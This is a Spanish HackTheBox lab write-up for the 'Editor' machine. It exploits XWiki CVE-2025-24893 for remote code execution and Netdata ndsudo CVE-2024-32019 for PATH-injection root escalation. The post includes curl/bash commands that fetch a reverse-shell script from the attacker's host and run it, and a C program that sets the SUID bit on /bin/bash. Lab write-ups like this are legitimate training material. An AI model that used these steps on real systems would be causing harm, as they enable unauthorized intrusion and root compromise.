---
layout: post
title: "Editor: HTB"
date: 2025-12-19
categories: [HTB]
tags: [HackTheBox, Java, Path Injection, xwiki, netdata]
image: "../assets/machines/HTB/HTB_Editor/logo.png"
---
Editor es un servidor Linux con XWiki vulnerable a inyección de scripts Groovy, lo que permite ejecución remota de código. Se obtienen credenciales de la base de datos y acceso a un usuario con contraseña reutilizada. También, un binario vulnerable de NetData permite escalar privilegios a root mediante inyección de PATH.

# Analizando los puertos

Hacemos el scanneo con:
{% highlight bash %}
rustscan -a <IP> --ulimit 5000 --no-banner: -sCV -n -Pn -oN Targeted
{% endhighlight %}

Encontramos puertos interesantes, pero lo que podemos apreciar en el puerto 80 es que apunta a una direccion:

`80 -> "http://editor.htb"`

Lo agregamos en el <span class="color-text-red">/etc/hosts</span>

Usando <span class="color-text-yellow">**whatweb**</span> podremos ver lo siguiente:

Si vamos a la web, podremos ver la siguiente UI, pero si vamos a la documetacion nos hara la redireccion a un nuevo dominio:

`http://wiki.editor.htb/xwiki`

Lo agregamos al **/etc/hosts**, para luego poder ver lo siguiente:

Si filtramos por versiones, podremos ver que se usa la version **15.10.8**

Haciendo una busqueda rapida nos encontraremos con un CVE para **alguien que no esta autenticado**.
[Link Al Boletin de Informacion](https://www.vulncheck.com/blog/xwiki-cve-2025-24893-eitw)

## CVE-2025-24893
Este CVE tiene una puntuacion elevada, la razon es porque explota un parametro no sanitizado, permitiendo ejecutar comandos de forma unautenticada.

Por lo que buscaremos la existencia del endpoint dentro del sistema:

**BINGO**, ahora trataremos de usar el siguiente payload dentro de burpsuite, **NO OLVIDAR** URLEncodear **TODOS** los caracteres:

Una vez tenemos la ejecucion remota de comandos, procederemos a hacer lo siguiente:

`curl <IP>/revshell -o /tmp/test.sh`

`bash /tmp/test.sh`

Hacemos esto debido a que no podemos ejecutar directamente una revshell concatenando el pipeline.

# Usuario
Una vez dentro del servidor, si buscamos en google sobre la ubicacion del archivo que permite la conexion entre la base de datos y el servicio, nos toparemos que es un archivo que se llama `hibernate.cfg.xml`.
Si lo buscamos, buscaremos por una password y daremos con una, intentaremos reutilizarla con el usuario `oliver`.

Una vez dentro, buscaremos la forma de elevar nuestros privilegios al usuario **ROOT**.

Si buscamos por archivos SUID no encontraremos gran cosa, exceptuando un `ndsudo`, si buscamos por servicios que esten corriendo dentro del servidor encontramos un puerto interesante `19999`, por lo que lo traeremos a nuestra maquina.

Una vez hecho el tunneling, podemos ver el contenido, veremos un dashboard, lo que nos interesa es buscar versiones, y la obtendremos precisamente al dar click a la alerta.

# PRIVESC: CVE-2024-32019
Obtendremos que se esta empleando una version desactualizada, la `Ntdata 1.45.2` para ser exactos.
Si buscamos en Google, nos encontraremos el siguiente articulo:
[Link del paper](https://www.wiz.io/vulnerability-database/cve/cve-2024-32019)

En el cual se explica que existe un binario con el permiso SUID, el que vimos antes, llamado `ndsudo`, el cual parece ser vulnerable a **PATH Injection**.

Para llevar a cabo esta explotacion, es necesario seguir los siguientes pasos:

- Crear un archivo y compilarlo en nuestra maquina atacante.

- Hacer el cambio de la variable PATH dentro del servidor y ejecutar el archivo.

Primero, para crear el ejecutable, usaremos el siguiente trozo de codigo:
{% highlight c %}
#include <unistd.h>
#include <stddef.h>

int main() {
    setuid(0);
    setgid(0);
    execl("/bin/chmod", "chmod", "u+s", "/bin/bash", NULL);
    return 0;
}
{% endhighlight %}

Lo compilaremos con:
{% highlight bash %}
gcc -o nvme exploit.c -static
{% endhighlight %}

Una vez subido el archivo al servidor, le daremos permisos de ejecucion y ejecutaremos el comando
{% highlight bash %}
/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list
{% endhighlight %}

# FIN
